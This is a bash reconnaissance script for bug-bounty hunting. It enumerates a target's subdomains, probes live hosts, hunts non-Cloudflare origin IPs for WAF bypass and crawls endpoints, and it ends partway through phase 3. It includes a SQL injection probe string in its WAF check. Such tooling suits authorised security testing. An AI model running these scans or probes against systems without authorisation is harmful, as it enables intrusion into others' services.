#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  ELITE BUG BOUNTY FRAMEWORK v7.0 — OWASP 2025 DEEP EDITION                ║
# ║  Ctrl+C: 1st press = skip phase (saves partial data), 2nd = abort scan     ║
# ║  Usage: bash elite_recon_v7.sh <target.com> [OPTIONS]                      ║
# ║         bash elite_recon_v7.sh --resume <output_dir>                       ║
# ║  OPTIONS: --phase N  --deep  --nuclei-all  --no-brute  --cloud             ║
# ║           --asn  --github  --oob  --rate N  --threads N  --out <dir>       ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

set -uo pipefail
IFS=$'\n\t'

# ── COLORS ─────────────────────────────────────────────────────────────────────
RED='\033[0;31m';    GREEN='\033[0;32m';   YELLOW='\033[1;33m'
BLUE='\033[0;34m';   CYAN='\033[0;36m';    MAGENTA='\033[0;35m'
BOLD='\033[1m';      DIM='\033[2m';        NC='\033[0m'
BG_RED='\033[41m';   BG_GREEN='\033[42m';  BG_BLUE='\033[44m'
BG_MAG='\033[45m';   BG_CYAN='\033[46m';   BG_YELLOW='\033[43m'

# ── ARGUMENT PARSING ───────────────────────────────────────────────────────────
DOMAIN=""
H1_URL=""
RESUME_DIR=""
START_PHASE=1
DEEP_MODE=false;    NUCLEI_ALL=false;   SKIP_BRUTE=false
CLOUD_MODE=false;   ASN_MODE=false;     GITHUB_MODE=false
OOB_MODE=false;     NUCLEI_RATE=100;    HTTP_THREADS=50
CUSTOM_OUT=""

if [ $# -lt 1 ]; then
    echo -e "${RED}Usage: $0 <target.com> [OPTIONS]"
    echo -e "       $0 --resume <output_dir>${NC}"; exit 1
fi

[[ "${1:-}" == "--resume" ]] && { RESUME_DIR="${2:-}"; shift 2 2>/dev/null || true; }
[[ "${1:-}" == "--h1"     ]] && { H1_URL="${2:-}";     shift 2 2>/dev/null || true; }
[[ $# -gt 0 && "${1:-}" != --* && -n "${1:-}" ]] && { DOMAIN="${1:-}"; shift; }

while [[ $# -gt 0 ]]; do
    case "${1:-}" in
        --resume)     RESUME_DIR="${2:-}";    shift 2 2>/dev/null || shift ;;
        --h1)         H1_URL="${2:-}";        shift 2 2>/dev/null || shift ;;
        --phase)      START_PHASE="${2:-1}";  shift 2 2>/dev/null || shift ;;
        --deep)       DEEP_MODE=true ;;
        --nuclei-all) NUCLEI_ALL=true ;;
        --no-brute)   SKIP_BRUTE=true ;;
        --cloud)      CLOUD_MODE=true ;;
        --asn)        ASN_MODE=true ;;
        --github)     GITHUB_MODE=true ;;
        --oob)        OOB_MODE=true ;;
        --rate)       NUCLEI_RATE="${2:-100}"; shift 2 2>/dev/null || shift ;;
        --threads)    HTTP_THREADS="${2:-50}"; shift 2 2>/dev/null || shift ;;
        --out)        CUSTOM_OUT="${2:-}";     shift 2 2>/dev/null || shift ;;
        "")           shift ;;
        *) echo -e "${YELLOW}[!] Unknown option: ${1:-}${NC}" ;;
    esac
    shift 2>/dev/null || true
done

# ── RESUME LOGIC ───────────────────────────────────────────────────────────────
if [ -n "$RESUME_DIR" ]; then
    [ ! -d "$RESUME_DIR" ] && {
        echo -e "${RED}[x] Resume directory not found: $RESUME_DIR${NC}"; exit 1
    }
    CHECKPOINT_FILE="$RESUME_DIR/.checkpoint"
    if [ -f "$CHECKPOINT_FILE" ]; then
        START_PHASE=$(grep "^LAST_PHASE=" "$CHECKPOINT_FILE" 2>/dev/null \
            | cut -d= -f2 || echo 1)
        DOMAIN=$(grep "^DOMAIN=" "$CHECKPOINT_FILE" 2>/dev/null \
            | cut -d= -f2 || echo "")
        CUSTOM_OUT="$RESUME_DIR"
        echo -e "${GREEN}[+] Resuming Phase $START_PHASE | Domain: $DOMAIN${NC}"
    else
        echo -e "${YELLOW}[!] No checkpoint — starting fresh${NC}"; START_PHASE=1
    fi
fi

# ── PATHS ──────────────────────────────────────────────────────────────────────
TOOLS_DIR="/root/tools"
SECLISTS="/usr/share/seclists"
RESOLVERS="$TOOLS_DIR/resolvers.txt"
[ ! -f "$RESOLVERS" ] && RESOLVERS="/root/resolvers.txt"
NUCLEI_TEMPLATES="/root/nuclei-templates"
[ ! -d "$NUCLEI_TEMPLATES" ] && NUCLEI_TEMPLATES="$HOME/nuclei-templates"
DATE=$(date +"%Y-%m-%d_%H-%M")
START_TIME=$(date +%s)

# ═════════════════════════════════════════════════════════════════════════════
# SIGNAL HANDLING — CTRL+C PHASE-SKIP SYSTEM
#   1st Ctrl+C: PHASE_SKIP=true  → all loops check_skip and break
#               partial data already saved to files
#               scan continues from next phase
#   2nd Ctrl+C: SCAN_ABORTED=true → checkpoint saved → exit 130
# ═════════════════════════════════════════════════════════════════════════════
CURRENT_PHASE=0
PHASE_SKIP=false
SCAN_ABORTED=false
_SIGINT_COUNT=0

handle_sigint() {
    _SIGINT_COUNT=$(( _SIGINT_COUNT + 1 ))
    if [ "$_SIGINT_COUNT" -eq 1 ]; then
        PHASE_SKIP=true
        printf "\n${YELLOW}[CTRL+C] Phase %d interrupted — partial data saved.${NC}\n" \
            "$CURRENT_PHASE" >&2
        printf "${DIM}         Continuing to next phase. Press Ctrl+C again to abort.${NC}\n\n" >&2
    else
        SCAN_ABORTED=true
        PHASE_SKIP=true
        printf "\n${RED}[ABORT] Scan aborted by user.${NC}\n" >&2
        printf "${YELLOW}  Resume: bash %s --resume %s${NC}\n\n" \
            "$0" "${OUT_DIR:-./$(basename "$0" .sh)}" >&2
        if [ -n "${CHECKPOINT_FILE:-}" ] && [ -d "${OUT_DIR:-}" ]; then
            printf "LAST_PHASE=%d\nDOMAIN=%s\nDATE=%s\nABORTED=%s\n" \
                "$CURRENT_PHASE" "${DOMAIN:-}" "$DATE" "$(date)" \
                > "$CHECKPOINT_FILE" 2>/dev/null || true
        fi
        exit 130
    fi
}
trap 'handle_sigint' INT

# ── HELPERS ────────────────────────────────────────────────────────────────────
log_phase() {
    printf "\n${BOLD}${BG_BLUE} PHASE %s: %s ${NC}\n\n" "$1" "$2"
}
log_owasp()    { printf "\n${BOLD}${BG_CYAN} [OWASP 2025] %s ${NC}\n\n" "$1"; }
log_verified() { printf "${BOLD}${BG_GREEN} VERIFIED: %s ${NC}\n" "$1"; }
log_fp()       { printf "${DIM}  [FP-FILTERED] %s${NC}\n" "$1"; }
log_info()     { printf "${CYAN}  [*]${NC} %s\n" "$1"; }
log_success()  { printf "${GREEN}  [+]${NC} %s\n" "$1"; }
log_warn()     { printf "${YELLOW}  [!]${NC} %s\n" "$1"; }
log_found()    { printf "${MAGENTA}  [*]${NC} ${BOLD}%s${NC}\n" "$1"; }
log_critical() { printf "${BOLD}${BG_RED} CRITICAL: %s ${NC}\n" "$1"; }
log_stat()     { printf "${DIM}      -> %s${NC}\n" "$1"; }
log_skip()     { printf "${YELLOW}  [SKIPPED]${NC} %s (Ctrl+C)\n" "$1"; }

count_lines()  { [ -f "$1" ] && [ -s "$1" ] && grep -c "" "$1" 2>/dev/null || echo "0"; }
safe_cat()     { [ -f "$1" ] && [ -s "$1" ] && cat "$1" 2>/dev/null || true; }
elapsed()      {
    local d=$(( $(date +%s) - START_TIME ))
    printf "%02d:%02d:%02d" $((d/3600)) $(((d%3600)/60)) $((d%60))
}

# Safe tool runner — never exits the script on failure
t_run() {
    local secs="$1"; shift
    timeout "$secs" "$@" 2>/dev/null || true
}

# URL-encode a string
urlencode() {
    python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1" \
        2>/dev/null || printf '%s' "$1" | \
        sed 's/ /%20/g;s/&/%26/g;s/=/%3D/g;s/?/%3F/g;s/#/%23/g'
}

# Returns 1 if phase should be skipped; exits if scan aborted
check_skip() {
    [ "${SCAN_ABORTED:-false}" = true ] && exit 130
    [ "${PHASE_SKIP:-false}" = true ]   && return 1
    return 0
}

# Start a phase — resets skip flag, sets CURRENT_PHASE
start_phase() {
    local n="$1" t="$2"
    [ "${SCAN_ABORTED:-false}" = true ] && exit 130
    CURRENT_PHASE=$n
    PHASE_SKIP=false
    _SIGINT_COUNT=0
    log_phase "$n" "$t"
}

# End a phase — show skip notice if needed, reset flags, save checkpoint
end_phase() {
    local n="$1"
    [ "${PHASE_SKIP:-false}" = true ] && \
        log_skip "Phase $n partial — data written to $OUT_DIR"
    PHASE_SKIP=false
    _SIGINT_COUNT=0
    if [ "$n" -eq 16 ]; then
        printf "LAST_PHASE=99\nDOMAIN=%s\nDATE=%s\nCOMPLETED=%s\n" \
            "${DOMAIN:-}" "$DATE" "$(date)" > "${CHECKPOINT_FILE:-/dev/null}" 2>/dev/null || true
    else
        save_checkpoint $(( n + 1 ))
    fi
}

should_run_phase() { [ "${1}" -ge "$START_PHASE" ]; }
wait_bg()          { wait 2>/dev/null || true; }

# ── CHECKPOINT SYSTEM ─────────────────────────────────────────────────────────
save_checkpoint() {
    local phase="$1"
    [ -z "${CHECKPOINT_FILE:-}" ] && return 0
    printf "LAST_PHASE=%d\nDOMAIN=%s\nDATE=%s\nSAVED=%s\n" \
        "$phase" "${DOMAIN:-}" "$DATE" "$(date)" \
        > "$CHECKPOINT_FILE" 2>/dev/null || true
    log_stat "Checkpoint saved -> Phase $phase"
}

# ── 5-LAYER FALSE POSITIVE VALIDATION ─────────────────────────────────────────
# L1: Response received  L2: Code matches  L3: Min content size
# L4: Reproducible       L5: Not generic 404 body
fp_validate() {
    local url="$1" context="${2:-finding}" expected="${3:-200}" min_bytes="${4:-50}"
    local code size code2 body
    code=$(t_run 15 curl -sk -o /dev/null -w "%{http_code}" \
        --max-time 10 --connect-timeout 6 "$url" 2>/dev/null || echo "000")
    [[ "$code" == "000" ]] && { log_fp "$context — no response"; return 1; }
    [[ "$code" != "$expected" ]] && { log_fp "$context — got $code expected $expected"; return 1; }
    size=$(t_run 15 curl -sk -o /dev/null -w "%{size_download}" \
        --max-time 10 --connect-timeout 6 "$url" 2>/dev/null || echo "0")
    [ "${size:-0}" -lt "$min_bytes" ] && { log_fp "$context — too small (${size}b)"; return 1; }
    sleep 0.4
    code2=$(t_run 15 curl -sk -o /dev/null -w "%{http_code}" \
        --max-time 10 --connect-timeout 6 "$url" 2>/dev/null || echo "000")
    [[ "$code2" != "$code" ]] && { log_fp "$context — not reproducible ($code->$code2)"; return 1; }
    body=$(t_run 15 curl -sk --max-time 10 --connect-timeout 6 "$url" 2>/dev/null | head -c 2048)
    echo "$body" | grep -qiE \
        "(404 not found|page not found|object not found|does not exist|no such file)" && {
        log_fp "$context — generic 404 body"; return 1
    }
    return 0
}

differs_from_baseline() {
    local a="$1" b="$2"
    local ha hb
    ha=$(t_run 15 curl -sk --max-time 10 "$a" 2>/dev/null | md5sum | cut -d' ' -f1)
    sleep 0.2
    hb=$(t_run 15 curl -sk --max-time 10 "$b" 2>/dev/null | md5sum | cut -d' ' -f1)
    [[ -n "$ha" && -n "$hb" && "$ha" != "$hb" ]]
}

detect_waf() {
    local url="$1" code
    code=$(t_run 12 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
        "${url}?id=1'%20OR%20'1'%3D'1'--" 2>/dev/null || echo "000")
    [[ "$code" == "403" || "$code" == "406" || "$code" == "429" || "$code" == "418" ]]
}

rl_backoff() { log_warn "Rate limited — backing off 8s"; sleep 8; }

# ── PoC GENERATOR ─────────────────────────────────────────────────────────────
VERIFIED_FINDINGS_FILE=""

write_poc() {
    local title="$1" severity="$2" owasp="$3" url="$4"
    local curl_cmd="$5" impact="$6" steps="$7"
    [ -z "${VERIFIED_FINDINGS_FILE:-}" ] && return 0
    {
        printf "\n================================================================\n"
        printf "TITLE:     %s\n"     "$title"
        printf "SEVERITY:  %s\n"     "$severity"
        printf "OWASP:     %s\n"     "$owasp"
        printf "URL:       %s\n"     "$url"
        printf "TIMESTAMP: %s\n"     "$(date '+%Y-%m-%d %H:%M:%S')"
        printf "================================================================\n\n"
        printf "IMPACT:\n%s\n\n"     "$impact"
        printf "STEPS TO REPRODUCE:\n%b\n\n" "$steps"
        printf "PROOF OF CONCEPT (curl):\n%b\n" "$curl_cmd"
        printf "\n----------------------------------------------------------------\n"
    } >> "$VERIFIED_FINDINGS_FILE" 2>/dev/null || true
    log_verified "$title [$severity]"
}

# ── BANNER & DEP CHECK ─────────────────────────────────────────────────────────
print_banner() {
    printf "\n${BOLD}${BG_MAG}"
    printf "  ELITE RECON v7.0 -- OWASP 2025 DEEP EDITION                    \n"
    printf "  CTRL+C SKIP | 5-LAYER FP FILTER | WAF DETECT | FULL WORKFLOW   \n"
    printf "${NC}\n"
    printf "${BOLD}  Target  :${NC} %s\n"  "$DOMAIN"
    printf "${BOLD}  Output  :${NC} %s\n"  "${CUSTOM_OUT:-auto}"
    printf "${BOLD}  Date    :${NC} %s\n"  "$DATE"
    printf "${BOLD}  Phase   :${NC} Starting from %d\n" "$START_PHASE"
    printf "${BOLD}  Ctrl+C  :${NC} 1st = skip phase, 2nd = abort scan\n\n"
}

check_deps() {
    local REQUIRED=(curl wget python3 dig nmap nslookup)
    local RECOMMENDED=(amass subfinder assetfinder httpx dnsx katana nuclei
                       gf arjun ffuf waybackurls gauplus subjs jq
                       interactsh-client gospider)
    local missing_req=()
    printf "${BOLD}[*] Dependency check:${NC}\n"
    for t in "${REQUIRED[@]}"; do
        command -v "$t" &>/dev/null \
            && printf "  ${GREEN}[+]${NC} %s\n" "$t" \
            || { printf "  ${RED}[x]${NC} %s (REQUIRED)\n" "$t"; missing_req+=("$t"); }
    done
    for t in "${RECOMMENDED[@]}"; do
        command -v "$t" &>/dev/null \
            && printf "  ${GREEN}[+]${NC} %s\n" "$t" \
            || printf "  ${YELLOW}[~]${NC} %s (optional)\n" "$t"
    done
    [ ${#missing_req[@]} -gt 0 ] && {
        printf "\n${RED}[x] Missing required: %s${NC}\n" "${missing_req[*]}"; exit 1
    }
    printf "\n"
}

# ══════════════════════════════════════════════════════════════════════════════
# DOMAIN SETUP & OUTPUT DIRECTORY
# ══════════════════════════════════════════════════════════════════════════════
DOMAIN=$(echo "${DOMAIN:-}" | sed 's|https\?://||;s|/.*||' | tr '[:upper:]' '[:lower:]')
if [ -z "$DOMAIN" ]; then
    echo -e "${RED}[✗] No target domain specified.${NC}"; exit 1
fi

if [ -n "$CUSTOM_OUT" ] && [ -d "$CUSTOM_OUT" ]; then
    OUT_DIR="$CUSTOM_OUT"
else
    OUT_DIR="${CUSTOM_OUT:-./results_${DOMAIN}_${DATE}}"
fi

# Sub-directories
mkdir -p \
    "$OUT_DIR/01-recon"            \
    "$OUT_DIR/02-fingerprint"      \
    "$OUT_DIR/03-endpoints"        \
    "$OUT_DIR/04-parameters"       \
    "$OUT_DIR/05-owasp/a01-access-control" \
    "$OUT_DIR/05-owasp/a02-misconfig"      \
    "$OUT_DIR/05-owasp/a03-supply-chain"   \
    "$OUT_DIR/05-owasp/a04-crypto"         \
    "$OUT_DIR/05-owasp/a05-injection"      \
    "$OUT_DIR/05-owasp/a06-design"         \
    "$OUT_DIR/05-owasp/a07-auth"           \
    "$OUT_DIR/05-owasp/a08-integrity"      \
    "$OUT_DIR/05-owasp/a09-logging"        \
    "$OUT_DIR/05-owasp/a10-exceptions"     \
    "$OUT_DIR/06-js-analysis"      \
    "$OUT_DIR/07-cloud"            \
    "$OUT_DIR/08-advanced"         \
    "$OUT_DIR/09-reports"          \
    "$OUT_DIR/09-reports/pocs"     \
    "$OUT_DIR/10-screenshots"

CHECKPOINT_FILE="$OUT_DIR/.checkpoint"
VERIFIED_FINDINGS_FILE="$OUT_DIR/09-reports/verified_findings.txt"
[ ! -f "$VERIFIED_FINDINGS_FILE" ] && \
    printf "# ELITE RECON v7 — VERIFIED FINDINGS — %s\n# Domain: %s\n\n" \
        "$DATE" "$DOMAIN" > "$VERIFIED_FINDINGS_FILE" 2>/dev/null || true

# Master files (persistent across phases)
MASTER_SUBS="$OUT_DIR/01-recon/master_subdomains.txt"
MASTER_ALIVE="$OUT_DIR/01-recon/master_alive.txt"
MASTER_WEB="$OUT_DIR/01-recon/master_web.txt"
MASTER_URLS="$OUT_DIR/01-recon/master_urls.txt"
MASTER_ENDPOINTS="$OUT_DIR/03-endpoints/master_endpoints.txt"
MASTER_JS="$OUT_DIR/06-js-analysis/master_js.txt"
MASTER_PARAMS="$OUT_DIR/04-parameters/master_params.txt"
MASTER_TECH="$OUT_DIR/02-fingerprint/tech_fingerprints.txt"

for f in "$MASTER_SUBS" "$MASTER_ALIVE" "$MASTER_WEB" "$MASTER_URLS" \
          "$MASTER_ENDPOINTS" "$MASTER_JS" "$MASTER_PARAMS" "$MASTER_TECH"; do
    [ ! -f "$f" ] && touch "$f" 2>/dev/null || true
done

# ══════════════════════════════════════════════════════════════════════════════
# PRE-FLIGHT CHECKS & BANNER
# ══════════════════════════════════════════════════════════════════════════════


print_banner
check_deps


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1: PASSIVE RECONNAISSANCE — SUBDOMAIN ENUMERATION (10+ SOURCES)
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 1; then
start_phase 1 "PASSIVE RECON — SUBDOMAIN ENUMERATION (10+ SOURCES)"
mkdir -p "$OUT_DIR/01-recon/raw_sources"

# ── 1a. Tool-based enumeration (parallel) ──────────────────────────────────
log_info "Running passive enumeration tools in parallel..."
ENUM_PIDS=()

# amass
if command -v amass &>/dev/null; then
    (t_run 300 amass enum -passive -d "$DOMAIN" -silent \
        2>/dev/null | tee "$OUT_DIR/01-recon/raw_sources/amass.txt" | \
        grep -c "" > "$OUT_DIR/01-recon/raw_sources/amass.count" 2>/dev/null || true) &
    ENUM_PIDS+=($!)
fi

# subfinder
if command -v subfinder &>/dev/null; then
    (t_run 180 subfinder -d "$DOMAIN" -silent -all \
        2>/dev/null > "$OUT_DIR/01-recon/raw_sources/subfinder.txt" || true) &
    ENUM_PIDS+=($!)
fi

# assetfinder
if command -v assetfinder &>/dev/null; then
    (t_run 120 assetfinder --subs-only "$DOMAIN" \
        2>/dev/null > "$OUT_DIR/01-recon/raw_sources/assetfinder.txt" || true) &
    ENUM_PIDS+=($!)
fi

# ── 1b. HTTP API sources (parallel) ────────────────────────────────────────
(t_run 60 curl -sk "https://crt.sh/?q=%25.${DOMAIN}&output=json" \
    | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    for e in data:
        for n in str(e.get('name_value','')).split('\n'):
            if '.' in n: print(n.strip().lstrip('*. '))
except: pass
" 2>/dev/null | sort -u > "$OUT_DIR/01-recon/raw_sources/crtsh.txt" || true) &
ENUM_PIDS+=($!)

(t_run 60 curl -sk "https://api.hackertarget.com/hostsearch/?q=${DOMAIN}" 2>/dev/null \
    | cut -d',' -f1 > "$OUT_DIR/01-recon/raw_sources/hackertarget.txt" || true) &
ENUM_PIDS+=($!)

(t_run 60 curl -sk "https://rapiddns.io/subdomain/${DOMAIN}?full=1" 2>/dev/null \
    | grep -oP "([a-zA-Z0-9_\-\.]+\.${DOMAIN})" | sort -u \
    > "$OUT_DIR/01-recon/raw_sources/rapiddns.txt" || true) &
ENUM_PIDS+=($!)

(t_run 60 curl -sk "https://otx.alienvault.com/api/v1/indicators/domain/${DOMAIN}/passive_dns" \
    2>/dev/null | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    for e in data.get('passive_dns',[]):
        h=e.get('hostname','')
        if h.endswith('.${DOMAIN}'): print(h)
except: pass
" 2>/dev/null | sort -u > "$OUT_DIR/01-recon/raw_sources/otx.txt" || true) &
ENUM_PIDS+=($!)

(t_run 60 curl -sk \
    "https://api.threatcrowd.org/v2/domain/report/?domain=${DOMAIN}" 2>/dev/null \
    | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    for s in data.get('subdomains',[]): print(s)
except: pass
" 2>/dev/null | sort -u > "$OUT_DIR/01-recon/raw_sources/threatcrowd.txt" || true) &
ENUM_PIDS+=($!)

(t_run 60 curl -sk "https://dns.bufferover.run/dns?q=.${DOMAIN}" 2>/dev/null \
    | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    for r in d.get('FDNS_A',[])+d.get('RDNS',[]): print(r.split(',')[-1])
except: pass
" 2>/dev/null | grep -F ".${DOMAIN}" | sort -u \
    > "$OUT_DIR/01-recon/raw_sources/bufferover.txt" || true) &
ENUM_PIDS+=($!)

# Web Archive (Wayback)
if command -v waybackurls &>/dev/null; then
    (printf "%s" "$DOMAIN" | t_run 120 waybackurls 2>/dev/null \
        | grep -oP "([a-zA-Z0-9_\-\.]+\.${DOMAIN})" | sort -u \
        > "$OUT_DIR/01-recon/raw_sources/wayback_subs.txt" || true) &
    ENUM_PIDS+=($!)
fi

# gauplus
if command -v gauplus &>/dev/null; then
    (t_run 120 gauplus -t 5 -subs "$DOMAIN" 2>/dev/null \
        | grep -oP "([a-zA-Z0-9_\-\.]+\.${DOMAIN})" | sort -u \
        > "$OUT_DIR/01-recon/raw_sources/gauplus_subs.txt" || true) &
    ENUM_PIDS+=($!)
fi

# ── Wait for parallel jobs (respects PHASE_SKIP) ───────────────────────────
SKIP_WAIT=false
for pid in "${ENUM_PIDS[@]}"; do
    if [ "${PHASE_SKIP:-false}" = true ]; then
        SKIP_WAIT=true
        kill "$pid" 2>/dev/null || true
    else
        wait "$pid" 2>/dev/null || true
    fi
done
[ "$SKIP_WAIT" = true ] && log_skip "Some passive sources killed (Ctrl+C)"

# ── 1c. DNS Brute-force ────────────────────────────────────────────────────
if [ "${SKIP_BRUTE:-false}" = false ] && [ "${PHASE_SKIP:-false}" = false ]; then
    log_info "DNS bruteforce..."
    WORDLIST=""
    for wl in \
        "$SECLISTS/Discovery/DNS/subdomains-top1million-5000.txt" \
        "$SECLISTS/Discovery/DNS/bitquark-subdomains-top100000.txt" \
        "/usr/share/wordlists/subdomains.txt"; do
        [ -f "$wl" ] && { WORDLIST="$wl"; break; }
    done

    if [ -n "$WORDLIST" ]; then
        if command -v dnsx &>/dev/null && [ -f "$RESOLVERS" ]; then
            t_run 600 dnsx -d "$DOMAIN" \
                -w "$WORDLIST" -silent -r "$RESOLVERS" \
                2>/dev/null > "$OUT_DIR/01-recon/raw_sources/brute.txt" || true
        elif command -v subfinder &>/dev/null; then
            t_run 600 subfinder -d "$DOMAIN" -w "$WORDLIST" -silent \
                2>/dev/null >> "$OUT_DIR/01-recon/raw_sources/subfinder.txt" || true
        fi
    else
        log_warn "No wordlist found for brute-force — skipping"
    fi
fi
check_skip || { log_skip "Phase 1 brute DNS"; end_phase 1; }

# ── 1d. ASN / IP range discovery ──────────────────────────────────────────
if [ "${ASN_MODE:-false}" = true ] && [ "${PHASE_SKIP:-false}" = false ]; then
    log_info "ASN discovery..."
    ORG=$(t_run 20 curl -sk "https://ipinfo.io/$(dig +short "$DOMAIN" | head -1)/org" \
        2>/dev/null | tr -d '"' | cut -d' ' -f2- | head -c 80 || true)
    [ -n "$ORG" ] && log_found "ASN Org: $ORG"
    t_run 60 curl -sk "https://api.bgpview.io/search?query_term=$(urlencode "$ORG")" \
        2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    for r in d.get('data',{}).get('ipv4_prefixes',[]):
        print(r.get('prefix',''))
except: pass
" 2>/dev/null | sort -u > "$OUT_DIR/07-cloud/asn_ranges.txt" || true
fi

# ── 1e. GitHub subdomain leakage ─────────────────────────────────────────
if [ "${GITHUB_MODE:-false}" = true ] && [ -n "${GITHUB_TOKEN:-}" ] \
   && [ "${PHASE_SKIP:-false}" = false ]; then
    log_info "GitHub subdomain/secret search..."
    t_run 60 curl -sk \
        -H "Authorization: token $GITHUB_TOKEN" \
        "https://api.github.com/search/code?q=${DOMAIN}&per_page=30" \
        2>/dev/null | python3 -c "
import sys,json,re
try:
    d=json.load(sys.stdin)
    for item in d.get('items',[]):
        print(item.get('html_url',''))
except: pass
" 2>/dev/null | sort -u > "$OUT_DIR/01-recon/github_hits.txt" || true
    [ -s "$OUT_DIR/01-recon/github_hits.txt" ] && \
        log_found "GitHub hits: $(count_lines "$OUT_DIR/01-recon/github_hits.txt")"
fi

# ── 1f. Merge & deduplicate all sources ───────────────────────────────────
log_info "Merging sources..."
find "$OUT_DIR/01-recon/raw_sources/" -type f -name "*.txt" \
    -exec cat {} \; 2>/dev/null \
    | grep -Eo "([a-zA-Z0-9_\-]+\.)+${DOMAIN}" \
    | grep -v "^[[:space:]]*$" \
    | sort -u > "$MASTER_SUBS"

# Ensure the base domain is included
echo "$DOMAIN" >> "$MASTER_SUBS"
sort -u "$MASTER_SUBS" -o "$MASTER_SUBS"

log_success "Total unique subdomains: $(count_lines "$MASTER_SUBS")"
end_phase 1
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 2: LIVE HOST DETECTION & TECH FINGERPRINTING
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 2; then
start_phase 2 "LIVE HOST DETECTION & TECH FINGERPRINTING"

[ ! -s "$MASTER_SUBS" ] && {
    log_warn "No subdomains found — adding base domain only"
    echo "$DOMAIN" > "$MASTER_SUBS"
}

# ── 2a. DNS resolution ────────────────────────────────────────────────────
log_info "DNS resolution..."
if command -v dnsx &>/dev/null; then
    t_run 300 dnsx -l "$MASTER_SUBS" -silent -resp -a \
        2>/dev/null > "$OUT_DIR/01-recon/dns_resolved.txt" || true
    grep -oP "^[^\s]+" "$OUT_DIR/01-recon/dns_resolved.txt" \
        | sort -u > "$MASTER_ALIVE"
else
    while IFS= read -r sub; do
        check_skip || break
        t_run 5 dig +short "$sub" @8.8.8.8 &>/dev/null && echo "$sub" >> "$MASTER_ALIVE" || true
    done < <(safe_cat "$MASTER_SUBS")
    sort -u "$MASTER_ALIVE" -o "$MASTER_ALIVE" 2>/dev/null || true
fi
log_success "DNS-resolved hosts: $(count_lines "$MASTER_ALIVE")"
check_skip || { end_phase 2; }

# ── 2b. HTTP probing ──────────────────────────────────────────────────────
log_info "HTTP probing..."
if command -v httpx &>/dev/null; then
    t_run 400 httpx -l "$MASTER_ALIVE" -silent \
        -title -status-code -tech-detect -follow-redirects \
        -threads "$HTTP_THREADS" -timeout 10 \
        2>/dev/null | tee "$OUT_DIR/02-fingerprint/httpx_full.txt" \
        | grep -oP "https?://[^\s]+" | sort -u > "$MASTER_WEB" || true
    # Write tech fingerprints
    grep -oP "https?://[^\s]+\s+\[[^\]]+\]" "$OUT_DIR/02-fingerprint/httpx_full.txt" \
        2>/dev/null > "$MASTER_TECH" || true
else
    # Fallback: curl-based probe
    while IFS= read -r host; do
        check_skip || break
        for proto in https http; do
            URL="${proto}://${host}"
            CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" \
                --max-time 8 --connect-timeout 5 "$URL" 2>/dev/null || echo "000")
            [[ "$CODE" != "000" ]] && echo "$URL" >> "$MASTER_WEB" && break
        done
    done < <(safe_cat "$MASTER_ALIVE")
    sort -u "$MASTER_WEB" -o "$MASTER_WEB" 2>/dev/null || true
fi
log_success "Live web targets: $(count_lines "$MASTER_WEB")"
check_skip || { end_phase 2; }

# ── 2c. Wayback / Gauplus URLs ────────────────────────────────────────────
log_info "Historical URL extraction..."
if command -v waybackurls &>/dev/null; then
    echo "$DOMAIN" | t_run 180 waybackurls 2>/dev/null \
        | sort -u >> "$MASTER_URLS" || true
fi
if command -v gauplus &>/dev/null; then
    t_run 180 gauplus -t 5 "$DOMAIN" 2>/dev/null \
        | sort -u >> "$MASTER_URLS" || true
fi
sort -u "$MASTER_URLS" -o "$MASTER_URLS" 2>/dev/null || true
log_stat "Historical URLs: $(count_lines "$MASTER_URLS")"

# ── 2d. Port scan on non-CF origins ──────────────────────────────────────
if command -v dnsx &>/dev/null; then
    t_run 120 dnsx -l "$MASTER_ALIVE" -silent -a -resp-only \
        2>/dev/null | sort -u > "$OUT_DIR/07-cloud/all_ips.txt" || true
fi
: > "$OUT_DIR/07-cloud/non_cf_ips.txt"
while IFS= read -r ip; do
    check_skip && break
    echo "$ip" | grep -qE \
        "^(104\.(1[6-9]|2[0-9]|3[01])\.|172\.(6[4-9]|7[01])\.|162\.158\.|198\.41\.|190\.93\.|188\.114\.)" || \
        echo "$ip" >> "$OUT_DIR/07-cloud/non_cf_ips.txt"
done < <(safe_cat "$OUT_DIR/07-cloud/all_ips.txt")
[ "$(count_lines "$OUT_DIR/07-cloud/non_cf_ips.txt")" -gt 0 ] && \
    log_found "Non-CF origin IPs (WAF bypass possible): $(count_lines "$OUT_DIR/07-cloud/non_cf_ips.txt")"

end_phase 2
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 3: ENDPOINT DISCOVERY — CRAWL + PARAMS + JS EXTRACTION
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 3; then
start_phase 3 "ENDPOINT DISCOVERY — CRAWL, JS ANALYSIS & PARAMETER EXTRACTION"

# ── 3a. Web crawling ─────────────────────────────────────────────────────
log_info "Crawling..."
if command -v katana &>/dev/null && [ -s "$MASTER_WEB" ]; then
    KATANA_FLAGS="-silent -jc -d 4 -kf all -fx -timeout 15 -retry 2"
    [ "$DEEP_MODE" = true ] && KATANA_FLAGS="$KATANA_FLAGS -d 7 -rl 100 -aff"
    t_run 600 katana -l "$MASTER_WEB" $KATANA_FLAGS \
        2>/dev/null -o "$OUT_DIR/03-endpoints/katana_crawl.txt" || true
fi

if command -v gospider &>/dev/null && [ -s "$MASTER_WEB" ] \
   && [ "${PHASE_SKIP:-false}" = false ]; then
    t_run 360 gospider -S "$MASTER_WEB" -o "$OUT_DIR/03-endpoints/gospider/" \
        -t 10 -d 3 --js --sitemap --robots -q 2>/dev/null || true
    find "$OUT_DIR/03-endpoints/gospider/" -type f 2>/dev/null \
        | xargs cat 2>/dev/null \
        | grep -Eo "https?://[^\s'\"]+" | sort -u \
        >> "$OUT_DIR/03-endpoints/katana_crawl.txt" || true
fi

# Merge all endpoint sources
